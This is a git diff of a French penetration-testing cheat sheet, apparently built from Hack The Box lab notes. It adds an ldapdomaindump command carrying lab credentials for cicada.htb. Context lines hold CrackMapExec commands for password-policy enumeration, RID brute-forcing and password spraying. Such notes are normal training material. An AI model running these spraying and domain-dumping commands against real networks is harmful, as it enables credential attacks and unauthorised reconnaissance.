@@ -300,6 +300,8 @@ Invoke-RestMethod -Uri $url -OutFile $dest`
 - CrackMapExec (énumérer les politiques de sécurité AD) --> `crackmapexec smb $TARGET --pass-pol -u '' -p ''`
   	- Obtenir les utilisateurs de l'AD --> `crackmapexec smb 10.129.186.60 --pass-pol -u 'guest' -p '' --rid-brute`
   	- Password spraying (test des mots de passe sur plusieurs machines) --> `crackmapexec smb 10.10.110.0/24 -u 'mrb3n' -p 'W3lc0me123!!!'` ou `crackmapexec winrm 127.0.0.1 -u jbercov -p dante_password`
+ 
+- Ldapdomaindump (depuis un utilisateur extraire toutes les informations) --> `ldapdomaindump ldap://cicada.htb -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'`
 
 - Utilisation de BloodHunt --> https://hackmd.io/Adw1ACZ_TJWMmDr1HIesqA?both#BloodHunt
 
